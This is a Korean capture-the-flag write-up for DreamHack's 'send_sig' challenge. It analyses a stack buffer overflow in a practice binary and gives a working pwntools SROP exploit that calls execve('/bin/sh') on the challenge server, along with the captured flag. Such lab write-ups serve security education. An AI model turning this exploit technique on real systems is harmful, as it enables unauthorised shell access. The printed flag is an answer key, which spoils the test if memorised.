# [DreamHack] send_sig

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 서버로 signal을 보낼 수 있는 프로그램입니다!
> 프로그램의 취약점을 찾고, 익스플로잇해 flag를 읽어보세요.
> flag는 home/send_sig/flag.txt에 있습니다.
>
> Release: [send_sig.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8533321/send_sig.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/161734841-cf4a5da4-81b2-47ad-8e42-fdd5c500542b.png)

## Analysis

```c
ssize_t vuln()
{
  char buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7uLL);
  return read(0, buf, 0x400uLL);
}
```

`read(0, buf, 0x400uLL)`에서 BOF가 발생한다. 충분히 긴 입력을 줄 수 있어서 ROP를 수행할 수 있다.

![image](https://user-images.githubusercontent.com/102066383/161742186-b2851ac1-b729-445d-821f-ed7800e9d7c0.png)

바이너리에 `pop rax; ret`, `syscall; ret` 가젯과 `"/bin/sh"` 문자열이 있으므로, 이를 이용해서 SROP로 `execve("/bin/sh", 0, 0)`을 호출하여 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *
context(arch='amd64')

REMOTE = True

if not REMOTE:
    r = process('/home/send_sig/send_sig')
else:
    r = remote('host1.dreamhack.games', 16223)

pop_rax = 0x4010ae  # pop rax; ret
syscall = 0x4010b0  # syscall; ret
binsh = 0x402000  # "/bin/sh"

payload = b'a' * 0x10  # dummy
payload += p64(pop_rax)
payload += p64(0xf)  # syscall number of rt_sigreturn
payload += p64(syscall)

# execve("/bin/sh", 0, 0)
frame = SigreturnFrame()
frame.rax = 0x3b  # syscall number of execve
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
payload += bytes(frame)

r.sendafter('Signal:', payload)

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 16223: Done
[*] Switching to interactive mode
$ cat flag.txt
DH{2F84BD30D87330534AC417647DA4EEDC}
```